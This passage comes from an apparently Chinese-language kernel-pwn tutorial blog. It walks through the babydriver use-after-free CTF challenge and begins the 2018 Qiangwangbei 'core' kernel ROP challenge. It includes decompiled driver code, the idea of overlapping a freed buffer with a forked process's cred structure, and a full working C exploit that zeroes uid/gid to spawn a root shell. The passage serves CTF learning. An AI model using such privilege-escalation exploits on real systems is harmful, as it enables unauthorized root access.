class="keyword">return</span> v6;</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>先检查长度是否小于 babydev_struct.device_buf_len，然后把 babydev_struct.device_buf 中的数据拷贝到 buffer 中，buffer 和长度都是用户传递的参数</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span> __fastcall <span class="title function_">babywrite</span><span class="params">(file *filp, <span class="type">const</span> <span class="type">char</span> *buffer, <span class="type">size_t</span> length, <span class="type">loff_t</span> *offset)</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">size_t</span> v4; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">size_t</span> result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">size_t</span> v6; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(filp, buffer);</span><br><span class="line">  <span class="keyword">if</span> ( !babydev_struct.device_buf )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">  result = <span class="number">-2LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( babydev_struct.device_buf_len &gt; v4 )</span><br><span class="line">  {</span><br><span class="line">    v6 = v4;</span><br><span class="line">    copy_from_user();</span><br><span class="line">    <span class="keyword">return</span> v6;</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>类似 babyread，不同的是从 buffer 拷贝到全局变量中</p>
<h3 id="ioctl"><a href="#ioctl" class="headerlink" title="ioctl"></a>ioctl</h3><p>还有一个ioctl这个函数</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">babyioctl</span><span class="params">(file *filp, __int64 command, <span class="type">unsigned</span> __int64 arg)</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">size_t</span> v3; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">size_t</span> v4; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v5; <span class="comment">// rdx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(filp, command);</span><br><span class="line">  v4 = v3;</span><br><span class="line">  <span class="keyword">if</span> ( command == <span class="number">65537</span> )</span><br><span class="line">  {</span><br><span class="line">    kfree(babydev_struct.device_buf);</span><br><span class="line">    babydev_struct.device_buf = _kmalloc(v4, <span class="number">37748928LL</span>);</span><br><span class="line">    babydev_struct.device_buf_len = v4;</span><br><span class="line">    printk(<span class="string">"alloc done\n"</span>, <span class="number">37748928LL</span>, v5);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  {</span><br><span class="line">    printk(&amp;unk_2EB, v3, v3);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-22LL</span>;</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>定义了 0x10001 的命令，可以释放全局变量 babydev_struct 中的 device_buf，再根据用户传递的 size 重新申请一块内存，并设置 device_buf_len。kalloc分配一个指定size的内存地址赋给device_buf</p>
<p>看到这里应该可以很明显的看到uaf，其实和正常的程序都差不多，SLAB和SLUB都是内核的内存管理机制和堆管理很类似。free之后要给清0，否则会存在uaf，这里也是相同的道理</p>
<h2 id="漏洞利用思路"><a href="#漏洞利用思路" class="headerlink" title="漏洞利用思路"></a>漏洞利用思路</h2><p>这里其实就是个竞争uaf漏洞。也就是说如果我们同时打开两个设备，第二次会覆盖第一次分配的空间，因为 babydev_struct 是全局的。同样，如果释放第一个，那么第二个其实是被是释放过的，这样就造成了一个 UAF。</p>
<p>初始化两个，释放第一个，再给第一个ioctl到指定的地址，接下来修改第二个其实就是修改的第一个的地址内容。因为存在uaf，重启再用不会清0。</p>
<p>这里最关键的是buf是全局变量，两个都用的是一个buf，存在竞争。前面说到过提权的方法，可以改cred来进行root提权，这个版本是：4.4.72</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> {</span></span><br><span class="line">    <span class="type">atomic_t</span>    usage;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line">    <span class="type">atomic_t</span>    subscribers;    <span class="comment">/* number of processes subscribed */</span></span><br><span class="line">    <span class="type">void</span>        *put_addr;</span><br><span class="line">    <span class="type">unsigned</span>    magic;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRED_MAGIC  0x43736564</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRED_MAGIC_DEAD 0x44656144</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="type">kuid_t</span>      uid;        <span class="comment">/* real UID of the task */</span></span><br><span class="line">    <span class="type">kgid_t</span>      gid;        <span class="comment">/* real GID of the task */</span></span><br><span class="line">    <span class="type">kuid_t</span>      suid;       <span class="comment">/* saved UID of the task */</span></span><br><span class="line">    <span class="type">kgid_t</span>      sgid;       <span class="comment">/* saved GID of the task */</span></span><br><span class="line">    <span class="type">kuid_t</span>      euid;       <span class="comment">/* effective UID of the task */</span></span><br><span class="line">    <span class="type">kgid_t</span>      egid;       <span class="comment">/* effective GID of the task */</span></span><br><span class="line">    <span class="type">kuid_t</span>      fsuid;      <span class="comment">/* UID for VFS ops */</span></span><br><span class="line">    <span class="type">kgid_t</span>      fsgid;      <span class="comment">/* GID for VFS ops */</span></span><br><span class="line">    <span class="type">unsigned</span>    securebits; <span class="comment">/* SUID-less security management */</span></span><br><span class="line">    <span class="type">kernel_cap_t</span>    cap_inheritable; <span class="comment">/* caps our children can inherit */</span></span><br><span class="line">    <span class="type">kernel_cap_t</span>    cap_permitted;  <span class="comment">/* caps we're permitted */</span></span><br><span class="line">    <span class="type">kernel_cap_t</span>    cap_effective;  <span class="comment">/* caps we can actually use */</span></span><br><span class="line">    <span class="type">kernel_cap_t</span>    cap_bset;   <span class="comment">/* capability bounding set */</span></span><br><span class="line">    <span class="type">kernel_cap_t</span>    cap_ambient;    <span class="comment">/* Ambient capability set */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span>   jit_keyring;    <span class="comment">/* default keyring to attach requested</span></span><br><span class="line"><span class="comment">                     * keys to */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span> __<span class="title">rcu</span> *<span class="title">session_keyring</span>;</span> <span class="comment">/* keyring inherited over fork */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span>  *<span class="title">process_keyring</span>;</span> <span class="comment">/* keyring private to this process */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span>  *<span class="title">thread_keyring</span>;</span> <span class="comment">/* keyring private to this thread */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span>  *<span class="title">request_key_auth</span>;</span> <span class="comment">/* assumed request_key authority */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line">    <span class="type">void</span>        *security;  <span class="comment">/* subjective LSM security */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span>   <span class="comment">/* real user ID subscription */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span> *<span class="title">user_ns</span>;</span> <span class="comment">/* user_ns the caps and keyrings are relative to. */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">group_info</span> *<span class="title">group_info</span>;</span>  <span class="comment">/* supplementary groups for euid/fsgid */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">rcu</span>;</span>        <span class="comment">/* RCU deletion hook */</span></span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure>

<p>那么根据 UAF 的思想，思路如下：</p>
<ol>
<li>打开两次设备，通过 ioctl 更改其大小为 cred 结构体的大小</li>
<li>释放其中一个，fork 一个新进程，那么这个新进程的 cred 的空间就会和之前释放的空间重叠</li>
<li>同时，我们可以通过另一个文件描述符对这块空间写，只需要将 uid，gid 改为 0，即可以实现提权到 root</li>
</ol>
<p>需要确定 cred 结构体的大小，有了源码，大小就很好确定了。计算一下是 0xa8（注意使用相同内核版本的源码）。</p>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span>{</span><br><span class="line">    <span class="type">int</span> fd1, fd2;</span><br><span class="line">    <span class="comment">//打开两次</span></span><br><span class="line">    fd1 = open(<span class="string">"dev/babydev"</span>,O_RDWR);</span><br><span class="line">    fd2 = open(<span class="string">"dev/babydev"</span>,O_RDWR);</span><br><span class="line">    <span class="comment">//修改 babydev_struct.device_buf_len 为 sizeof(struct cred)</span></span><br><span class="line">    ioctl(fd1, <span class="number">65537</span>, <span class="number">0xa8</span>);</span><br><span class="line">    close(fd1);</span><br><span class="line">    <span class="comment">// 新起进程的 cred 空间会和刚刚释放的 babydev_struct 重叠</span></span><br><span class="line">    <span class="type">int</span> pid = fork();</span><br><span class="line">    <span class="keyword">if</span>(pid == <span class="number">0</span>){</span><br><span class="line">        <span class="comment">// 通过更改 fd2，修改新进程的 cred 的 uid，gid 等值为0</span></span><br><span class="line">        <span class="type">char</span> buf[<span class="number">28</span>] = {<span class="number">0</span>};</span><br><span class="line">        write(fd2, buf, <span class="number">28</span>);</span><br><span class="line">        <span class="keyword">if</span>(getuid() == <span class="number">0</span>){</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">"[+] root!!!!! pwned by z1r0!!!"</span>);</span><br><span class="line">            <span class="comment">// 起一个root shell</span></span><br><span class="line">            system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        }</span><br><span class="line">    }<span class="keyword">else</span> <span class="keyword">if</span>(pid &lt; <span class="number">0</span>){</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[-] failed"</span>);</span><br><span class="line">    }<span class="keyword">else</span>{</span><br><span class="line">        wait(<span class="literal">NULL</span>);</span><br><span class="line">    }</span><br><span class="line">    close(fd2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>exp写完再写进包，运行exp就可以了。</p>
<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">➜  cb2 gcc exp.c -static -o file_system/exp</span><br><span class="line">➜  cb2 <span class="built_in">cd</span> file_system </span><br><span class="line">➜  file_system find . | cpio -o --format=newc &gt; ../rootfs.cpio</span><br><span class="line">13208 块</span><br><span class="line">➜  file_system <span class="built_in">cd</span> ..</span><br><span class="line">➜  cb2 ./boot.sh</span><br></pre></td></tr></tbody></table></figure>

<p><img src="/2021/11/25/kernel-pwn%EF%BC%88%E5%9B%9B%EF%BC%89%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/5.png"></p>
<h1 id="Kernel-ROP"><a href="#Kernel-ROP" class="headerlink" title="Kernel ROP"></a>Kernel ROP</h1><p>其实上面的这个uaf的题目也可以使用rop，上面的kernel的内核版本有点低了，保护也没怎么开，后面再写一下新的利用手法。但是uaf这个题还是很有价值的！入门必选题。这个rop就拿<strong>2018强网杯-core</strong>来学习。</p>
<blockquote>
<p>题目链接：链接: <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1EVL5xNBhM_Tc4X8RX-sd1A">https://pan.baidu.com/s/1EVL5xNBhM_Tc4X8RX-sd1A</a>  密码: ejk7</p>
</blockquote>
<h2 id="准备-1"><a href="#准备-1" class="headerlink" title="准备"></a>准备</h2><p>题目拿到手就是一个tar包。解压</p>
<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">➜  2018强网杯-core tar -xvf core_give.tar </span><br><span class="line">give_to_player/</span><br><span class="line">give_to_player/bzImage</span><br><span class="line">give_to_player/core.cpio</span><br><span class="line">give_to_player/start.sh</span><br><span class="line">give_to_player/vmlinux</span><br><span class="line">➜  2018强网杯-core <span class="built_in">ls</span></span><br><span class="line">core_give.tar  give_to_player</span><br><span class="line">➜  2018强网杯-core file give_to_player </span><br><span class="line">give_to_player: directory</span><br></pre></td></tr></tbody></table></figure>

<p>解压完成之后就可以看到下面的这些文件。</p>
<p><img src="/2021/11/25/kernel-pwn%EF%BC%88%E5%9B%9B%EF%BC%89%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/6.png"></p>
<p>还是看start.sh然后解包。<code>vmlinux</code> 则是静态编译，未经过压缩的 kernel 文件，相对应的 <code>bzImage</code> 可以理解为压缩后的文件</p>
<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">➜  give_to_player <span class="built_in">cat</span> start.sh</span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">-m 64M \</span><br><span class="line">-kernel ./bzImage \</span><br><span class="line">-initrd  ./core.cpio \</span><br><span class="line">-append <span class="string">"root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr"</span> \</span><br><span class="line">-s  \</span><br><span class="line">-netdev user,<span class="built_in">id</span>=t0, -device e1000,netdev=t0,<span class="built_in">id</span>=nic0 \</span><br><span class="line">-nographic  \</span><br></pre></td></tr></tbody></table></figure>

<p>start.sh就可以看出开了kaslr随机化保护，之前的vmlinux可以从里面找到一些 gadget，可以理解堆的用户态的libc.so。但是有些题目会没有vmlinux，这个时候我们需要通过 <a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux">extract-vmlinux</a> 提取。</p>
<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./extract-vmlinux ./bzImage &gt; vmlinux</span><br></pre></td></tr></tbody></table></figure>

<p><img src="/2021/11/25/kernel-pwn%EF%BC%88%E5%9B%9B%EF%BC%89%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/7.png"></p>
<p>解压之后，看一下init</p>
<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">➜  file_system <span class="built_in">cat</span> init </span><br><span class="line"><span class="comment">#!/bin/sh</span></span><br><span class="line">mount -t proc proc /proc</span><br><span class="line">mount -t sysfs sysfs /sys</span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line">/sbin/mdev -s</span><br><span class="line"><span class="built_in">mkdir</span> -p /dev/pts</span><br><span class="line">mount -vt devpts -o gid=4,mode=620 none /dev/pts</span><br><span class="line"><span class="built_in">chmod</span> 666 /dev/ptmx</span><br><span class="line"><span class="built_in">cat</span> /proc/kallsyms &gt; /tmp/kallsyms</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line">ifconfig eth0 up</span><br><span class="line">udhcpc -i eth0</span><br><span class="line">ifconfig eth0 10.0.2.15 netmask 255.255.255.0</span><br><span class="line">route add default gw 10.0.2.2 </span><br><span class="line">insmod /core.ko</span><br><span class="line"></span><br><span class="line">poweroff -d 120 -f &amp;</span><br><span class="line">setsid /bin/cttyhack setuidgid 1000 /bin/sh</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'sh end!\n'</span></span><br><span class="line">umount /proc</span><br><span class="line">umount /sys</span><br><span class="line"></span><br><span class="line">poweroff -d 0  -f</span><br></pre></td></tr></tbody></table></figure>

<p>这里面使用了<code>cat /proc/kallsyms &gt; /tmp/kallsyms</code>将kallsyms写进了tmp下接着echo 1使得kptr和dmesg不可以让普通用户读。但是上面将kallsyms写进了tmp，所以还是可以读kallsyms。</p>
<p>第18行写了一个定时关机，我们可以将它删除再重新写进包（影响我们）。<code>insmod /core.ko</code>插入了一个内核模块，所以看到现在我们可以知道题目应该是让我们分析这个模块。</p>
<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">➜  file_system <span class="built_in">cat</span> init </span><br><span class="line"><span class="comment">#!/bin/sh</span></span><br><span class="line">mount -t proc proc /proc</span><br><span class="line">mount -t sysfs sysfs /sys</span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line">/sbin/mdev -s</span><br><span class="line"><span class="built_in">mkdir</span> -p /dev/pts</span><br><span class="line">mount -vt devpts -o gid=4,mode=620 none /dev/pts</span><br><span class="line"><span class="built_in">chmod</span> 666 /dev/ptmx</span><br><span class="line"><span class="built_in">cat</span> /proc/kallsyms &gt; /tmp/kallsyms</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line">ifconfig eth0 up</span><br><span class="line">udhcpc -i eth0</span><br><span class="line">ifconfig eth0 10.0.2.15 netmask 255.255.255.0</span><br><span class="line">route add default gw 10.0.2.2 </span><br><span class="line">insmod /core.ko</span><br><span class="line"></span><br><span class="line"><span class="comment">#poweroff -d 120 -f &amp;</span></span><br><span class="line">setsid /bin/cttyhack setuidgid 1000 /bin/sh</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'sh end!\n'</span></span><br><span class="line">umount /proc</span><br><span class="line">umount /sys</span><br><span class="line"></span><br><span class="line">poweroff -d 0  -f</span><br></pre></td></tr></tbody></table></figure>

<p>接着发现了一个<strong>gen_cpio.sh</strong>我们看一下是什么东西。</p>
<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">➜  file_system <span class="built_in">cat</span> gen_cpio.sh </span><br><span class="line">find . -print0 \</span><br><span class="line">| cpio --null -ov --format=newc \</span><br><span class="line">| gzip -9 &gt; <span class="variable">$1</span></span><br></pre></td></tr></tbody></table></figure>

<p>这个其实就是为了让我们方便的进行打包操作。关键点看完之后那就打包吧。</p>
<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">➜  file_system ./gen_cpio.sh core.cpio</span><br><span class="line">➜  file_system <span class="built_in">cp</span> core.cpio ../</span><br><span class="line">➜  file_system <span class="built_in">ls</span></span><br><span class="line">bin        core.ko  gen_cpio.sh  lib    linuxrc  root  sys  usr</span><br><span class="line">core.cpio  etc      init         lib64  proc     sbin  tmp  vmlinux</span><br></pre></td></tr></tbody></table></figure>

<p>运行start.sh，结果却。。。</p>
<p><img src="/2021/11/25/kernel-pwn%EF%BC%88%E5%9B%9B%EF%BC%89%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/8.png"></p>
<p>经过仔细查看start&amp;init在start这个启动脚本里发现了第二行的-M参数分配了64M，我们改成128M就可以成功运行起来了。</p>
<p><img src="/2021/11/25/kernel-pwn%EF%BC%88%E5%9B%9B%EF%BC%89%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/9.png"></p>
<p>强网杯不愧是强网杯</p>
<h2 id="逆向分析-amp-漏洞挖掘-1"><a href="#逆向分析-amp-漏洞挖掘-1" class="headerlink" title="逆向分析 &amp; 漏洞挖掘"></a>逆向分析 &amp; 漏洞挖掘</h2><p>我们从准备阶段已经知道了需要对core.ko进行漏洞挖掘。所以我们给core.ko进ida，顺便看一下保护，开了canary</p>
<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">➜  file_system checksec --file=core.ko</span><br><span class="line">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FOE</span><br><span class="line">No RELRO        Canary found      NX disabled   REL             No RPATH   No RUNPATH   41) Symbols       o</span><br></pre></td></tr></tbody></table></figure>

<p><img src="/2021/11/25/kernel-pwn%EF%BC%88%E5%9B%9B%EF%BC%89%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/10.png"></p>
<h3 id="init-amp-exit-1"><a href="#init-amp-exit-1" class="headerlink" title="init &amp; exit"></a>init &amp; exit</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">init_module</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">  core_proc = proc_create(<span class="string">"core"</span>, <span class="number">438LL</span>, <span class="number">0LL</span>, &amp;core_fops);</span><br><span class="line">  printk(&amp;unk_2DE);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>init这个函数注册/proc/core</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">exit_core</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( core_proc )</span><br><span class="line">    <span class="keyword">return</span> remove_proc_entry(<span class="string">"core"</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>exit这个函数移除了/proc/core</p>
<h3 id="ioctl-1"><a href="#ioctl-1" class="headerlink" title="ioctl"></a>ioctl</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">core_ioctl</span><span class="params">(__int64 a1, <span class="type">int</span> a2, __int64 a3)</span></span><br><span class="line">{</span><br><span class="line">  <span class="keyword">switch</span> ( a2 )</span><br><span class="line">  {</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x6677889B</span>:</span><br><span class="line">      core_read(a3);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x6677889C</span>:</span><br><span class="line">      printk(&amp;unk_2CD);</span><br><span class="line">      off = a3;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x6677889A</span>:</span><br><span class="line">      printk(&amp;unk_2B3);</span><br><span class="line">      core_copy_func(a3);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>这个函数使用switch分别调用了<strong>read</strong>，<strong>copy_func</strong>这两个函数，并将off这个全局变量设置为a3。</p>
<h3 id="read"><a href="#read" class="headerlink" title="read"></a>read</h3><p>从ioctl来看接下来的函数，先是read</p>
